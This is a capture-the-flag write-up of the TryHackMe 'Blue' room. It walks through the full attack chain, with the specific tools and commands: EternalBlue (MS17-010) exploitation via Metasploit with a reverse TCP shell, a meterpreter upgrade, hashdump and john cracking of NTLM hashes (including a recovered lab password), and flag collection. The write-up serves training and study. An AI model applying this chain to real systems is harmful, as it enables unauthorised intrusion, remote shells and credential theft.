# Blue — TryHackMe — SYSTEM

**Date:** 2026-09-12
**Platform:** TryHackMe
**Outcome:** NT AUTHORITY\SYSTEM — **machine 10, first Windows box (Phase B)**
**Time:** 1h35 · Confidence self-rated 2/5
**Tools:** nmap, NSE (smb-vuln-*), Metasploit (ms17_010_eternalblue, multi/handler,
shell_to_meterpreter), meterpreter (search/cat/download), hashdump, john (NTLM)

---

## 0. TL;DR chain

nmap (all-Microsoft services, Server 2008 R2–2012 era) → 445 = the attack surface →
`nmap --script smb-vuln-*` → **MS17-010 / CVE-2017-0143 (EternalBlue)** → Metasploit
`ms17_010_eternalblue` + `windows/x64/shell/reverse_tcp` → crash → THM restart → **new IP** →
re-exploit → cmd shell as **nt authority\system** (kernel exploit = no privesc phase) →
persistent handler + `post/multi/manage/shell_to_meterpreter` (`HANDLER false`) → async
callback → **meterpreter session 2** → `hashdump` → `john --format=NT` → **Jon:alqfna22** →
meterpreter `search -f flag*.txt` → 3 flags (`C:\`, `System32\config`, `Users\Jon\AppData`)

## 1. Recon

| Port | Service | Means | Therefore |
|---|---|---|---|
| 135, 49152–49155 | msrpc | Windows RPC plumbing | normal noise |
| 139 / **445** | netbios-ssn / microsoft-ds | **SMB** | **the attack surface** (Kenobi's protocol) |
| 3389 | ms-wbt-server | RDP | a door credentials walk through (later) |
| 5985 | WinRM | PowerShell remoting | the Windows SSH (later) |

Every service Microsoft, OS fingerprint 2008 R2–2012 era. On Windows boxes, old + SMB is the
combination that decides the engagement — everything else on the list is furniture.

## 2. Vulnerability assessment

New tool category, first firing — **nmap's own vulnerability scripts**:

```
nmap -p 445 --script smb-vuln-* <target>
→ smb-vuln-ms17-010: VULNERABLE — CVE-2017-0143, RCE in SMBv1 servers
```

The scan named the CVE — no guessing, no CVE lottery (Ignite's lesson, held). MS17-010
"EternalBlue": kernel pool corruption in SMBv1, the engine behind WannaCry, the most
exploited flaw in Windows history.

## 3. Foothold (SYSTEM — straight to the top)

Metasploit, first real session: `search ms17-010` → `exploit/windows/smb/ms17_010_eternalblue`
— rank **average**, i.e. "works, but may crash the box."

1. **Did:** vocabulary, learned by error: **R = Remote = target, L = Local = you** (RHOST was
   first set to my own IP; Metasploit 6 mirrored it into LHOST by luck). **Exploit = how you
   get in; payload = what runs inside** (`set PAYLOAD exploit/...` was rejected — a module
   path is not a payload). `show options` before every `exploit`.

2. **Did:** first attempt — "target is vulnerable… Exploit completed, but no session was
   created." Read correctly the second time: the exploit *fired*; the *callback* failed.
   Second attempt died mid-protocol ("Read timeout… Socket") = **the box had crashed**.
   EternalBlue's reboot-retry loop: THM restart → **new IP (10.112.165.142)** → re-set
   RHOSTS → fire.

3. **Result:** `Command shell session 1 opened` → `whoami` → `nt authority\system`.
   Kernel exploit lands as SYSTEM — Windows root. No privesc phase on this box.

4. **Did:** prompt discipline — `ps` failed at `C:\Windows\system32>`: cmd.exe speaks Windows
   (`tasklist`), meterpreter speaks meterpreter (`ps`, `sysinfo`, `hashdump`). **The prompt is
   the map.**

## 4. Upgrade to meterpreter (the saga)

Room task: shell → meterpreter via `post/multi/manage/shell_to_meterpreter` (found with
msfconsole's own `search` — underscores, not hyphens; the tool knows its own contents).

1. **Did:** two runs with the module's built-in handler → no session. Diagnosis in the output:
   `[*] Stopping exploit/multi/handler` — the temporary listener **tears itself down** before
   a slow callback lands.

2. **Did:** removed the race — persistent listener of my own:
   `exploit/multi/handler` + meterpreter payload + LPORT 4445 + `run -j` (background job),
   then the post module with `set HANDLER false`.
   (Second `run -j` failed to bind 4445 — proof the first listener was alive. One listener
   per port.)

3. **The miss:** declared the upgrade dead ~10 seconds after `run`, killed session 1 and the
   jobs — and `Meterpreter session 2 opened` printed **seconds later, in the same transcript**.
   Async tools report success in the future tense: check, wait a minute, check again before
   pronouncing death. The unnecessary EternalBlue re-exploit afterwards was self-inflicted.

4. **Result:** session 2 alive — `meterpreter x64/windows, NT AUTHORITY\SYSTEM`.

## 5. Loot

1. **Did:** `hashdump` → `Name:RID:LM:NT:::` per account. Windows stores **two** hashes:
   **LM** = crippled legacy half (disabled → the constant `aad3b435…` = "empty");
   **NT** = NTLM (MD4 of the password) — the one that matters.

2. **The miss:** first john run had no `--format` → auto-detected **LM**, attacked the empty
   half, finished `0g` in one second — and "Session completed" was nearly read as success.
   **`0g` = zero cracked.** The fix was printed in john's own warning list:

   ```
   john --format=NT -w=rockyou.txt hash.txt   → alqfna22 (Jon), <1s
   ```

3. **Did:** flags via meterpreter `search -f flag*.txt` (the Windows `find`):
   - `C:\flag1.txt` — drive root
   - `C:\Windows\System32\config\flag2.txt` — the SAM/SYSTEM hive directory, i.e. the very
     database `hashdump` raided. The flag hides in the credential vault.
   - `C:\Users\Jon\AppData\…` — flag3, in Windows' per-user app-data tree (the messy cousin
     of Linux dotfiles). That location is the room's final question.

4. **Did:** `cat c:\flag1.txt` failed repeatedly — meterpreter's `cat`/`cd` choke on
   drive-letter absolute paths. Fix: **relative hops** (`cd Windows` → `cd System32` → …) or
   `download` the file and read it on Kali. Countermeasure for the retries themselves: the
   identical failing command was re-run 2–3× — **every retry changes one variable.**

## 6. Misses and dead ends

- **Premature death pronouncement on the async upgrade** → killed session, tore down jobs,
  re-exploited — the callback landed during the teardown. Wait for async artifacts.
- **`0g` misread as done** — read the verdict line, not the last line.
- **Identical failing commands re-run** (absolute-path `cat`/`cd`) — one variable per retry.
- **Google before msfconsole `search`** (`shell-to-meterpreter` with hyphens) — the tool in
  your hands indexes itself; browser second.
- **Metasploit vocabulary by trial** (RHOST vs LHOST, payload vs module) — `show options`
  first, set R/L deliberately.

## 7. Lessons

1. **Old Windows + 445 → `nmap --script smb-vuln-*`** and let the scan name the CVE.
2. **Metasploit taxonomy:** `exploit/` = entry, `auxiliary/` = scanners, `post/` = after
   access; rank "average" = expect crashes → reboot-retry loop; **THM reissues IPs on both
   ends** (machine restart and VPN reconnect).
3. **Handlers:** the module's temp handler is a race; run your own with `run -j` +
   `HANDLER false`. Callbacks are async — success prints late.
4. **Windows hashes:** LM = empty legacy half, NT = the real one → `john --format=NT`.
   Hashes get cracked, not guessed — tenth time the rule paid.
5. **SYSTEM = root**; kernel exploits skip the privesc phase. The prompt tells you which
   language to speak; meterpreter paths walk in relative hops.
